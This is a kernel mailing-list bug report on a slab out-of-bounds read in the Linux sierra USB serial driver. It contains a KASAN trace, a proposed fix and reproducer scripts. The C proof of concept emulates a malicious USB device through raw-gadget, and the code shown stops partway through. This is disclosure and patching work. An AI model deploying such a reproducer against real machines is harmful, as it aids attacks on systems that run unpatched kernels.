Received: from mail-pg1-f179.google.com (mail-pg1-f179.google.com [209.85.215.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DA4372C11FE
	for <stable@vger.kernel.org>; Tue, 14 Jul 2026 03:37:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784000262; cv=none; b=VIU3HB/nAXObJGZunfVRMuC+8CnNKOWqReijhRhXzwiR6V0RtUGsMtE9PXLMsCUoz8+y8lZdYnnWdRrexDtFiMmlCmw9MPccER/idSTQAQ3yUBm8/q1iwaKV8bCAw2XdSN7cHJe6sas6V7TkpnHD3sH7CbsLXRMdnWJcwu4hwn4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784000262; c=relaxed/simple;
	bh=BO3LeUjexrzZdwZgKABe84mN6ryhpyuqM5/yGVMOpBk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=DTCm9cyez68VB2/3keQcbI7d6eziMt04ga2GWQXiCBJzHLgRvoEHr7qyAZB4TokEtTq3Z1NKIewcEAOIrr2aFuf0TK3FPcwbh+Zl1KEfzEbRlruD9i1LALxNcwrsg1NmS1ATtOs3NLIupMHrz25lTfEvBLXFErSw2yekz2nCP1M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=RC4H0vVx; arc=none smtp.client-ip=209.85.215.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="RC4H0vVx"
Received: by mail-pg1-f179.google.com with SMTP id 41be03b00d2f7-c9eefcf9175so459975a12.3
        for <stable@vger.kernel.org>; Mon, 13 Jul 2026 20:37:39 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784000259; x=1784605059; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=qwkoOreAsJY/g+KBgwRw0GJ0qwo/2Zo7rX2XozyQlbY=;
        b=RC4H0vVxCBpuryWtV8TdBWu1g67n3iQD9aBukb4ohw+uVd05n9tYpyaCWkXlZJN7nE
         mSiGpSkrGmLLtlt4pdaPHjJqGjbODy3mnHE7eTjafbYuSNJufMD9xLlbssGsTF0pQnJ1
         qZJr48PCq8mT/ZGHB2xE6tjWVJF0l/rryBW8IbYn20Ng5IIJVKv1Ks5JQXCWIRgzZwoW
         UlkkeL6xcs8EV7NJrFdokwhsfy+rnTS0ts0ojKyoRS0zBUN5wtUKIN0zWyBO/C9KIiq0
         N9PiRltrxFCrF6lDGIwtM7e5tSt/3v/IVDN+yhJxwwCikSzgKCFuzVEOUJfzJ3ACYrBA
         YV2Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784000259; x=1784605059;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=qwkoOreAsJY/g+KBgwRw0GJ0qwo/2Zo7rX2XozyQlbY=;
        b=AN3vWfB+YrcZ9wFZCmJdzLObdHFGhoB+NWwC2SR5U4mxvimYR8cVJqTnPh3cULu+OV
         L3tsirWRGySHQZbv9qrX1jk4mQWIL86paiulBquV/K8it1g+vE+afgsLMtWblLItw+8N
         JE3vzF7NfKlLdkTP9Dk48IdTJndXKiIpGQUzGviOcMKp+YGTlxeR2OurgX0O8s5hvtvM
         8JNAde4was/U3AGdE9AaK5P1swOp/SLNdiJCao4IAsYnU4aIO2xZDAY1SPK/x3Cc+eII
         /xhyd/H218SOT9Luvfzdi0YxuA4HCK/AFAa2zuzuFmjG/EqDxRHdVAaortd0JrwWpUUB
         VNBg==
X-Forwarded-Encrypted: i=1; AHgh+RpxGBjQYpu2biiBgfk5/0vprv9L5pTaybsCkBh9Cp/V9nxdWs7oBYIXOtXFXNNHU+dWNbYPW4Y=@vger.kernel.org
X-Gm-Message-State: AOJu0Yxg7krxFj/DQGETZN0Wb2/QnpYsrB069UOb6xOzr1nP4mM1kQy0
	Shro/nAMlR5sbnFB30RIUC0o8kkqO6E9DA1c6OB8Ii69vU/Rew/wWsg2
X-Gm-Gg: AfdE7cl3dEiW+tw8raL9cLU36KWKy6Lg6goMVjAdbqcT13DzITe7amnLlbmccn35Glx
	2eBT7FkoM/scwSwPoxTcAw58vXBPYQMYTxVfVjApM/S3wCNxk76ps2gC/k28xalkBkX3YBUgIbd
	eiGOJSY8SoHEeDroVO8Vg6pxw0RF00Q8yA0j2IBoHHsHUhu4bF3bwArzDO3b3a5k3IzuWWRZId/
	C2fcQSS7c7yUkiL6lqne4yacctuJVy1T6+uhgEV/4rnQDB+OuIC/lxOIWMVlphqg2R4OF8Cw6hM
	EICI9L+f4Sut4vDp0Yo6GAlV36aOXwp1t2C6q30tuYnJxXUf6QWzdG6UavbdoHVDfPQI7xzFUDp
	Mh7RL4YfOcHTsLzoTP5brsP0xvy8GNV60FFgizp/0/l0s/ymzIBl2zyUtkp9gZTHY1x5xgZoOdv
	YKHUqi7CE1SwLHxWt5GkLsbTVLekqCklkHJVkjQVuuuOycQFJi7RU25g==
X-Received: by 2002:a05:6a21:3394:b0:3a8:21e0:1ffa with SMTP id adf61e73a8af0-3c110160cabmr14591618637.27.1784000258966;
        Mon, 13 Jul 2026 20:37:38 -0700 (PDT)
Received: from nixos (47-146-72-123.vng01.snbb.ca.frontiernet.net. [47.146.72.123])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-31174a583bcsm81148431eec.19.2026.07.13.20.37.38
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 13 Jul 2026 20:37:38 -0700 (PDT)
From: Jay Vadayath <jkrshnmenon@gmail.com>
To: Johan Hovold <johan@kernel.org>,
	Greg Kroah-Hartman <gregkh@linuxfoundation.org>
Cc: linux-usb@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org,
	Jay Vadayath <jkrshnmenon@gmail.com>
Subject: [BUG] USB: serial: sierra: slab-out-of-bounds read in sierra_instat_callback() on short interrupt-IN packet
Date: Mon, 13 Jul 2026 20:37:27 -0700
Message-ID: <20260714033729.11023-1-jkrshnmenon@gmail.com>
X-Mailer: git-send-email 2.51.2
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi,

I found a slab-out-of-bounds read in drivers/usb/serial/sierra.c that
is reachable from a malicious USB device.
This bug is similar to the one fixed in option.c by Jiale Yao on 2026-07-12
([PATCH] USB: serial: option: fix slab out-of-bounds read in option_instat_callback).

Summary
-------
sierra_instat_callback() handles the CDC-ACM-style SET_LINE_STATE
notification on the interrupt-IN endpoint. On status == 0 it:

  1. Reads the 8-byte usb_ctrlrequest header at transfer_buffer[0..7].
  2. If bRequestType/bRequest match 0xA1/0x20, reads a "signals" byte
     at transfer_buffer + sizeof(struct usb_ctrlrequest) - i.e. byte 8.

Neither read is bounded by urb->actual_length. The interrupt-IN
buffer is allocated by the driver's port-setup with
kmalloc(usb_endpoint_maxp(epd)), sized to the device-declared
endpoint wMaxPacketSize. A hostile device advertising
wMaxPacketSize=8 on its interrupt-IN endpoint pulls the buffer
from kmalloc-8 (exactly 8 bytes). When such a device then delivers
an 8-byte packet whose first two bytes are 0xA1 0x20, the callback
reads transfer_buffer[8] - exactly one byte past the end of the
slab object. KASAN flags this as slab-out-of-bounds.

Vulnerable code
---------------
drivers/usb/serial/sierra.c, sierra_instat_callback() (~line 573):

    if (status == 0) {
        struct usb_ctrlrequest *req_pkt = urb->transfer_buffer;

        if (!req_pkt) {
            dev_dbg(&port->dev, "%s: NULL req_pkt\n", __func__);
            return;
        }
        if ((req_pkt->bRequestType == 0xA1) &&
                (req_pkt->bRequest == 0x20)) {
            int old_dcd_state;
            unsigned char signals = *((unsigned char *)
                    urb->transfer_buffer +
                    sizeof(struct usb_ctrlrequest));   /* OOB when maxp==8 */

Affected versions
-----------------
Confirmed still present on master as of 2026-07-13 (HEAD 3b029c035b34bbc693405ddf759f0e9b920c27f1).

KASAN report
------------
Captured on v7.2.0-rc3, x86_64, QEMU + dummy_hcd.

BUG: KASAN: slab-out-of-bounds in sierra_instat_callback+0x599/0x5d0
Read of size 1 at addr ffff888003dedf88 by task swapper/0/0

Call Trace:
 <IRQ>
 sierra_instat_callback+0x599/0x5d0
 __usb_hcd_giveback_urb+0x23f/0x3f0
 dummy_timer+0xfe1/0x3470
 __hrtimer_run_queues+0x252/0x5a0
 hrtimer_run_softirq+0x1a4/0x3b0
 handle_softirqs+0x1bd/0x620
 __irq_exit_rcu+0x68/0x140
 sysvec_apic_timer_interrupt+0x6c/0x80
 </IRQ>

Allocated by task 11:
 __kmalloc_noprof+0x1bc/0x490
 usb_serial_probe+0x1c66/0x3fe0
 usb_probe_interface+0x279/0x980
 [... device_add/hub_event probe chain ...]

Reproducer
----------
The artifacts inlined below can be used to reproduce the bug.
Required kernel config options (delta on top of x86_64_defconfig):

  CONFIG_KASAN=y
  CONFIG_KASAN_GENERIC=y
  CONFIG_USB_SERIAL=y
  CONFIG_USB_SERIAL_SIERRAWIRELESS=y
  CONFIG_USB_GADGET=y
  CONFIG_USB_DUMMY_HCD=y
  CONFIG_USB_RAW_GADGET=y

Related work
------------
Jiale Yao posted an identical-class fix for the parallel bug in
option.c on 2026-07-12:

  [PATCH] USB: serial: option: fix slab out-of-bounds read in
          option_instat_callback
  https://lore.kernel.org/all/20260712170012.3503601-1-yaojiale02@163.com/

option_instat_callback() and sierra_instat_callback() are nearly
line-for-line copies.
The two fixes should probably land together.

Proposed fix
------------
Validate urb->actual_length before dereferencing the header, and
require one more byte before reading the signals field. The fix
below preserves sierra's existing "!req_pkt" NULL-check and layers
the length check as an additional guard; happy to reshape it to
match Jiale's idiom exactly (single combined "actual_length <
sizeof(*req_pkt) + 1" check, placed before the 0xA1/0x20 branch)
if that's preferred for cross-driver consistency.

diff --git a/drivers/usb/serial/sierra.c b/drivers/usb/serial/sierra.c
--- a/drivers/usb/serial/sierra.c
+++ b/drivers/usb/serial/sierra.c
@@ -570,13 +570,18 @@ static void sierra_instat_callback(struct urb *urb)
 	if (status == 0) {
 		struct usb_ctrlrequest *req_pkt = urb->transfer_buffer;

-		if (!req_pkt) {
-			dev_dbg(&port->dev, "%s: NULL req_pkt\n",
+		/*
+		 * The interrupt-in buffer is sized to the device-declared
+		 * endpoint wMaxPacketSize; validate the device actually sent a
+		 * full control-request header (and the trailing signal byte)
+		 * before dereferencing it, or a short packet causes an OOB read.
+		 */
+		if (!req_pkt || urb->actual_length < sizeof(*req_pkt)) {
+			dev_dbg(&port->dev, "%s: NULL/short req_pkt\n",
 				__func__);
-			return;
-		}
-		if ((req_pkt->bRequestType == 0xA1) &&
-				(req_pkt->bRequest == 0x20)) {
+		} else if ((req_pkt->bRequestType == 0xA1) &&
+				(req_pkt->bRequest == 0x20) &&
+				urb->actual_length >= sizeof(*req_pkt) + 1) {
 			int old_dcd_state;
 			unsigned char signals = *((unsigned char *)
 					urb->transfer_buffer +

Reported-by: Jay Vadayath <jkrshnmenon@gmail.com>

Thanks,

--- build.sh ---
#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="${1:?Usage: $0 <kernel-source-dir>}"
REPO="$(cd "$REPO" && pwd)"

CONFIG_SRC="$SCRIPT_DIR/387ee687512d2acd32d1d47ebcb1972e.config"

# sccache setup
export KBUILD_BUILD_TIMESTAMP=""
if command -v sccache &>/dev/null; then
    export CC="sccache gcc"
    echo "[build] Using sccache"
else
    export CC="gcc"
    echo "[build] sccache not found, using gcc directly"
fi

NPROC=$(nproc)

build_variant() {
    local variant="$1"
    local build_dir="$SCRIPT_DIR/builds/$variant"
    mkdir -p "$build_dir"

    echo "[build] ===== Building variant: $variant ====="

    # Copy base config
    cp "$CONFIG_SRC" "$REPO/.config"

    # Adjust config per variant
    case "$variant" in
        asan)
            # Config already has KASAN enabled, just ensure it
            "$REPO/scripts/config" --file "$REPO/.config" \
                -e KASAN -e KASAN_GENERIC -e KASAN_INLINE -e KASAN_STACK \
                -d KASAN_OUTLINE
            ;;
        *)
            echo "[build] Unknown variant: $variant"
            return 1
            ;;
    esac

    # Finalize config
    make -C "$REPO" olddefconfig > "$build_dir/config.log" 2>&1

    # Build kernel
    echo "[build] Building kernel for $variant ..."
    make -C "$REPO" -j"$NPROC" bzImage > "$build_dir/build.log" 2>&1 || {
        echo "[build] FAILED: see $build_dir/build.log"
        tail -30 "$build_dir/build.log"
        return 1
    }

    # Copy bzImage
    cp "$REPO/arch/x86/boot/bzImage" "$build_dir/bzImage"
    echo "[build] $variant bzImage -> $build_dir/bzImage"

    # Save config
    cp "$REPO/.config" "$build_dir/.config"
}

# Build the PoC binary (static, for initramfs)
echo "[build] Compiling PoC..."
gcc -O2 -static -pthread \
    -o "$SCRIPT_DIR/poc.bin" "$SCRIPT_DIR/poc.c" \
    || { echo "[build] PoC compilation failed"; exit 1; }
echo "[build] PoC compiled -> $SCRIPT_DIR/poc.bin"

# Build ASAN variant (the config already has KASAN)
build_variant asan

echo "[build] All builds complete."
echo "[build] Building initramfs..."
bash "$SCRIPT_DIR/build_initramfs.sh"
echo "[build] Done."


--- end build.sh ---

--- build_initramfs.sh ---
#!/usr/bin/env bash
# build_initramfs.sh - Minimal initramfs for the sierra_instat_callback
# reproducer: BusyBox static + /init + PoC binary. No SSH, no user
# accounts, no networking - the PoC runs at boot as root and powers off.
#
# Usage: ./build_initramfs.sh [-o <output_path>]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTPUT="$SCRIPT_DIR/initramfs/initramfs.cpio.gz"

# --- argument parsing ---
while [[ $# -gt 0 ]]; do
    case "$1" in
        -o|--output) OUTPUT="$2"; shift 2 ;;
        -h|--help)   sed -n '2,6p' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
        *)           echo "Unknown option: $1" >&2; exit 1 ;;
    esac
done
OUTPUT="$(realpath -m "$OUTPUT")"

command -v busybox >/dev/null 2>&1 \
    || { echo "busybox not found (install: sudo apt install busybox-static)" >&2; exit 1; }
BUSYBOX_BIN="$(command -v busybox)"

WORKDIR="$(mktemp -d /tmp/initramfs_build.XXXXXX)"
trap 'rm -rf "$WORKDIR"' EXIT
ROOT="$WORKDIR/rootfs"

mkdir -p "$ROOT"/{bin,sbin,dev,proc,sys,tmp,run,etc}

# --- BusyBox + applets ---
cp "$BUSYBOX_BIN" "$ROOT/bin/busybox"
chmod +x "$ROOT/bin/busybox"
for applet in $("$BUSYBOX_BIN" --list); do
    ln -s /bin/busybox "$ROOT/bin/$applet" 2>/dev/null || true
done

# --- /init ---
cat > "$ROOT/init" <<'INIT'
#!/bin/sh
export PATH=/bin:/sbin:/usr/bin:/usr/sbin

mount -t proc     proc  /proc
mount -t sysfs    sysfs /sys
mount -t devtmpfs dev   /dev
mount -t tmpfs    tmpfs /tmp
mount -t tmpfs    tmpfs /run

exec > /dev/console 2>&1
exec < /dev/console

# Let KASAN reports through
echo 7 > /proc/sys/kernel/printk 2>/dev/null || true

if [ -x /poc ]; then
    /poc 2>&1
    echo "[init] /poc exited with status $?"
    poweroff -f
fi
exec /bin/sh
INIT
chmod +x "$ROOT/init"

# --- PoC binary ---
if [[ -f "$SCRIPT_DIR/poc.bin" ]]; then
    cp "$SCRIPT_DIR/poc.bin" "$ROOT/poc"
    chmod +x "$ROOT/poc"
else
    echo "warning: $SCRIPT_DIR/poc.bin not found; run build.sh first" >&2
fi

# --- Minimum /dev nodes (devtmpfs at runtime supplants these) ---
(
    cd "$ROOT/dev"
    _SUDO="$(command -v fakeroot 2>/dev/null || echo sudo)"
    $_SUDO mknod -m 622 console c 5 1 2>/dev/null || true
    $_SUDO mknod -m 666 null    c 1 3 2>/dev/null || true
)

# --- Pack ---
mkdir -p "$(dirname "$OUTPUT")"
( cd "$ROOT"; find . | cpio -o -H newc 2>/dev/null ) | gzip -9 > "$OUTPUT"

echo "initramfs: $OUTPUT ($(du -k "$OUTPUT" | cut -f1) KiB)"


--- end build_initramfs.sh ---

--- poc.sh ---

#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOGS_DIR="$SCRIPT_DIR/logs"
rm -rf "$LOGS_DIR"
mkdir -p "$LOGS_DIR/asan"

BZIMAGE="$SCRIPT_DIR/builds/asan/bzImage"
INITRAMFS="$SCRIPT_DIR/initramfs/initramfs.cpio.gz"

if [[ ! -f "$BZIMAGE" ]]; then
    echo "[poc.sh] ERROR: $BZIMAGE not found. Run build.sh first."
    exit 1
fi
if [[ ! -f "$INITRAMFS" ]]; then
    echo "[poc.sh] ERROR: $INITRAMFS not found. Run build.sh first."
    exit 1
fi

# Determine QEMU acceleration
ACCEL="-accel tcg"
if [[ -e /dev/kvm ]] && [[ -w /dev/kvm ]]; then
    ACCEL="-accel kvm"
    echo "[poc.sh] Using KVM acceleration"
else
    echo "[poc.sh] Using TCG (no KVM)"
fi

SERIAL_LOG="$LOGS_DIR/asan/serial.log"
TIMEOUT=180

echo "[poc.sh] Booting ASAN kernel variant..."
echo "[poc.sh] Serial log -> $SERIAL_LOG"

# Boot QEMU with KASAN kernel
# Use loglevel=3 (KERN_ERR) to capture KASAN reports while being quiet
# kasan_multi_shot: allow multiple KASAN reports without halting
timeout "$TIMEOUT" qemu-system-x86_64 \
    $ACCEL \
    -m 2048 \
    -smp 2 \
    -kernel "$BZIMAGE" \
    -initrd "$INITRAMFS" \
    -append "console=ttyS0 root=/dev/ram rdinit=/init quiet loglevel=3 printk.devkmsg=off kasan_multi_shot=1" \
    -serial file:"$SERIAL_LOG" \
    -display none \
    -monitor none \
    -no-reboot \
    -net none \
    2>/dev/null || true

sleep 1

echo "[poc.sh] QEMU exited. Checking logs..."

# Also collect dmesg-like output from serial log
cp "$SERIAL_LOG" "$LOGS_DIR/asan/dmesg.log" 2>/dev/null || true

# Check for the target crash signature
echo ""
echo "===== Checking for KASAN slab-out-of-bounds in sierra_instat_callback ====="
if grep -q "BUG: KASAN: slab-out-of-bounds in sierra_instat_callback" "$SERIAL_LOG" 2>/dev/null; then
    echo "[poc.sh] SUCCESS: Found target crash signature!"
    echo ""
    echo "--- KASAN Report ---"
    grep -A 50 "BUG: KASAN: slab-out-of-bounds in sierra_instat_callback" "$SERIAL_LOG" | strings | head -60
    echo ""
    echo "--- Allocation trace ---"
    grep -A 20 "Allocated by task" "$SERIAL_LOG" | strings | head -25
    echo "---"
else
    echo "[poc.sh] Crash signature NOT found. Checking for any KASAN report..."
    if grep -q "BUG: KASAN" "$SERIAL_LOG" 2>/dev/null; then
        echo "[poc.sh] Found KASAN report (may not match target):"
        grep -B2 -A 30 "BUG: KASAN" "$SERIAL_LOG" | strings | head -40
    else
        echo "[poc.sh] No KASAN report found."
        echo "[poc.sh] Last 50 lines of serial log:"
        tail -50 "$SERIAL_LOG" 2>/dev/null | strings || echo "(empty)"
    fi
fi

echo ""
echo "===== Full serial log available at: $SERIAL_LOG ====="


--- end poc.sh ---

--- poc.c ---

// SPDX-License-Identifier: 0BSD
// PoC for sierra_instat_callback OOB read via raw-gadget + dummy_hcd
//
// Build: gcc -O2 -static -pthread -o poc poc.c

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <endian.h>
#ifndef cpu_to_le16
#define cpu_to_le16(x) htole16(x)
#endif
#ifndef le16_to_cpu
#define le16_to_cpu(x) le16toh(x)
#endif

#include <linux/usb/ch9.h>
#include <linux/usb/raw_gadget.h>

static void die(const char *msg) {
    perror(msg);
    exit(1);
}

static int fd_raw = -1;
static uint16_t ep_bulk_in_handle;
static uint16_t ep_bulk_out_handle;
static uint16_t ep_int_in_handle;

static int ep0_write(const void *buf, size_t len) {
    struct {
        struct usb_raw_ep_io io;
        uint8_t data[1024];
    } __attribute__((packed)) req;
    memset(&req, 0, sizeof(req));
    req.io.ep = 0;
    req.io.flags = 0;
    req.io.length = (uint32_t)len;
    if (len) memcpy(req.data, buf, len);
    return ioctl(fd_raw, USB_RAW_IOCTL_EP0_WRITE, &req);
}

static int ep0_read(void *buf, size_t bufsz) {
    struct {
        struct usb_raw_ep_io io;
        uint8_t data[1024];
    } __attribute__((packed)) req;
    memset(&req, 0, sizeof(req));
    req.io.ep = 0;
    req.io.flags = 0;
    req.io.length = (uint32_t)bufsz;
    int ret = ioctl(fd_raw, USB_RAW_IOCTL_EP0_READ, &req);
    if (ret < 0) return -1;
    if (buf && ret > 0) memcpy(buf, req.data, ret > (int)bufsz ? (int)bufsz : ret);
    return ret;
}

static int ep0_stall(void) {
    return ioctl(fd_raw, USB_RAW_IOCTL_EP0_STALL, 0);
}

static int ep_write(uint16_t eph, const void *buf, size_t len) {
    struct {
        struct usb_raw_ep_io io;
        uint8_t data[4096];
    } __attribute__((packed)) req;
    memset(&req, 0, sizeof(req));
    req.io.ep = eph;
    req.io.flags = 0;
    req.io.length = (uint32_t)len;
    if (len) memcpy(req.data, buf, len);
    return ioctl(fd_raw, USB_RAW_IOCTL_EP_WRITE, &req);
}

/* Packed 7-byte endpoint descriptor for config blob */
struct ep7 {
    uint8_t bLength;
    uint8_t bDescriptorType;
    uint8_t bEndpointAddress;
    uint8_t bmAttributes;
    uint16_t wMaxPacketSize;
    uint8_t bInterval;
} __attribute__((packed));

/* Descriptors */
static struct usb_device_descriptor dev_desc;
static struct usb_qualifier_descriptor qual_desc;

/* Config blob: 9 (config) + 9 (interface) + 7*3 (endpoints) = 39 bytes */
static uint8_t cfg_buf[256];
static size_t cfg_len;

static struct usb_endpoint_descriptor ep_bulk_out_desc;
static struct usb_endpoint_descriptor ep_bulk_in_desc;
static struct usb_endpoint_descriptor ep_int_in_desc;

static uint8_t addr_bulk_out;
static uint8_t addr_bulk_in;
static uint8_t addr_int_in;

static void pick_eps(void) {
    struct usb_raw_eps_info eps;
    memset(&eps, 0, sizeof(eps));
    int n = ioctl(fd_raw, USB_RAW_IOCTL_EPS_INFO, &eps);
    if (n < 0) die("EPS_INFO");
    addr_bulk_out = 0;
    addr_bulk_in = 0;
    addr_int_in = 0;
    for (int i = 0; i < n; i++) {
        struct usb_raw_ep_info *e = &eps.eps[i];
        if (!e->name[0]) continue;
        if (!addr_bulk_in && e->caps.type_bulk && e->caps.dir_in)
            addr_bulk_in = (uint8_t)(e->addr | USB_DIR_IN);
        if (!addr_bulk_out && e->caps.type_bulk && e->caps.dir_out)
            addr_bulk_out = (uint8_t)(e->addr & 0x7f);
        if (!addr_int_in && e->caps.type_int && e->caps.dir_in)
            addr_int_in = (uint8_t)(e->addr | USB_DIR_IN);
    }
    if (!addr_bulk_out || addr_bulk_out == USB_RAW_EP_ADDR_ANY) addr_bulk_out = 1;
    if (!addr_bulk_in || addr_bulk_in == USB_RAW_EP_ADDR_ANY) addr_bulk_in = USB_DIR_IN | 1;
    if (!addr_int_in || addr_int_in == USB_RAW_EP_ADDR_ANY) addr_int_in = USB_DIR_IN | 2;
    fprintf(stderr, "[poc] EPs: bout=0x%02x bin=0x%02x iin=0x%02x\n",
            addr_bulk_out, addr_bulk_in, addr_int_in);
}

static void build_descriptors(void) {
    memset(&dev_desc, 0, sizeof(dev_desc));
    dev_desc.bLength = USB_DT_DEVICE_SIZE;
    dev_desc.bDescriptorType = USB_DT_DEVICE;
    dev_desc.bcdUSB = cpu_to_le16(0x0200);
    dev_desc.bMaxPacketSize0 = 64;
    dev_desc.idVendor = cpu_to_le16(0x1199);
    dev_desc.idProduct = cpu_to_le16(0x0019);
    dev_desc.bcdDevice = cpu_to_le16(0x0100);
    dev_desc.iManufacturer = 1;
    dev_desc.iProduct = 2;
    dev_desc.iSerialNumber = 3;
    dev_desc.bNumConfigurations = 1;

    memset(&qual_desc, 0, sizeof(qual_desc));
    qual_desc.bLength = sizeof(qual_desc);
    qual_desc.bDescriptorType = USB_DT_DEVICE_QUALIFIER;
    qual_desc.bcdUSB = cpu_to_le16(0x0200);
    qual_desc.bMaxPacketSize0 = 64;
    qual_desc.bNumConfigurations = 1;

    /* Full 9-byte endpoint descriptors for EP_ENABLE */
    memset(&ep_bulk_out_desc, 0, sizeof(ep_bulk_out_desc));
    ep_bulk_out_desc.bLength = USB_DT_ENDPOINT_SIZE;
    ep_bulk_out_desc.bDescriptorType = USB_DT_ENDPOINT;
    ep_bulk_out_desc.bEndpointAddress = addr_bulk_out;
    ep_bulk_out_desc.bmAttributes = USB_ENDPOINT_XFER_BULK;
    ep_bulk_out_desc.wMaxPacketSize = cpu_to_le16(512);

    memset(&ep_bulk_in_desc, 0, sizeof(ep_bulk_in_desc));
    ep_bulk_in_desc.bLength = USB_DT_ENDPOINT_SIZE;
    ep_bulk_in_desc.bDescriptorType = USB_DT_ENDPOINT;
    ep_bulk_in_desc.bEndpointAddress = addr_bulk_in;
    ep_bulk_in_desc.bmAttributes = USB_ENDPOINT_XFER_BULK;
    ep_bulk_in_desc.wMaxPacketSize = cpu_to_le16(512);

    memset(&ep_int_in_desc, 0, sizeof(ep_int_in_desc));
    ep_int_in_desc.bLength = USB_DT_ENDPOINT_SIZE;
    ep_int_in_desc.bDescriptorType = USB_DT_ENDPOINT;
    ep_int_in_desc.bEndpointAddress = addr_int_in;
    ep_int_in_desc.bmAttributes = USB_ENDPOINT_XFER_INT;
    ep_int_in_desc.wMaxPacketSize = cpu_to_le16(8);
    ep_int_in_desc.bInterval = 1;

    /* Build the config descriptor blob manually to avoid alignment issues */
    uint8_t *p = cfg_buf;

    /* Config descriptor (9 bytes) */
    struct usb_config_descriptor cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.bLength = USB_DT_CONFIG_SIZE;
    cfg.bDescriptorType = USB_DT_CONFIG;
    /* wTotalLength filled below */
    cfg.bNumInterfaces = 1;
    cfg.bConfigurationValue = 1;
    cfg.bmAttributes = 0x80;
    cfg.bMaxPower = 50;
    memcpy(p, &cfg, 9); p += 9;

    /* Interface descriptor (9 bytes) */
    struct usb_interface_descriptor intf;
    memset(&intf, 0, sizeof(intf));
    intf.bLength = USB_DT_INTERFACE_SIZE;
    intf.bDescriptorType = USB_DT_INTERFACE;
    intf.bInterfaceNumber = 0;
    intf.bNumEndpoints = 3;
    intf.bInterfaceClass = USB_CLASS_VENDOR_SPEC;
    intf.bInterfaceSubClass = 0xff;
    intf.bInterfaceProtocol = 0xff;
    memcpy(p, &intf, 9); p += 9;

    /* Endpoint descriptors (7 bytes each, packed manually) */
    struct ep7 ep;

    /* Bulk OUT */
    memset(&ep, 0, 7);
    ep.bLength = 7;
    ep.bDescriptorType = USB_DT_ENDPOINT;
    ep.bEndpointAddress = addr_bulk_out;
    ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
    ep.wMaxPacketSize = cpu_to_le16(512);
    ep.bInterval = 0;
    memcpy(p, &ep, 7); p += 7;

    /* Bulk IN */
    memset(&ep, 0, 7);
    ep.bLength = 7;
    ep.bDescriptorType = USB_DT_ENDPOINT;
    ep.bEndpointAddress = addr_bulk_in;
    ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
    ep.wMaxPacketSize = cpu_to_le16(512);
    ep.bInterval = 0;
    memcpy(p, &ep, 7); p += 7;

    /* Interrupt IN (wMaxPacketSize = 8: CRITICAL for OOB) */
    memset(&ep, 0, 7);
    ep.bLength = 7;
    ep.bDescriptorType = USB_DT_ENDPOINT;
    ep.bEndpointAddress = addr_int_in;
    ep.bmAttributes = USB_ENDPOINT_XFER_INT;
    ep.wMaxPacketSize = cpu_to_le16(8);
    ep.bInterval = 1;
    memcpy(p, &ep, 7); p += 7;

    cfg_len = (size_t)(p - cfg_buf);
    /* Patch wTotalLength */
    cfg_buf[2] = (uint8_t)(cfg_len & 0xff);
    cfg_buf[3] = (uint8_t)((cfg_len >> 8) & 0xff);

    fprintf(stderr, "[poc] Config blob: %zu bytes total\n", cfg_len);
}

static void build_string_desc(uint8_t idx, uint8_t *out, size_t *out_len) {
    if (idx == 0) {
        out[0] = 4; out[1] = USB_DT_STRING;
        out[2] = 0x09; out[3] = 0x04;
        *out_len = 4;
        return;
    }
    const char *s = (idx == 1) ? "Sierra" : (idx == 2) ? "AirCard" : "poc0";
    size_t sl = strlen(s);
    size_t total = 2 + sl * 2;
    out[0] = (uint8_t)total;
    out[1] = USB_DT_STRING;
    for (size_t i = 0; i < sl; i++) {
        out[2 + 2*i] = (uint8_t)s[i];
        out[2 + 2*i + 1] = 0;
    }
    *out_len = total;
}

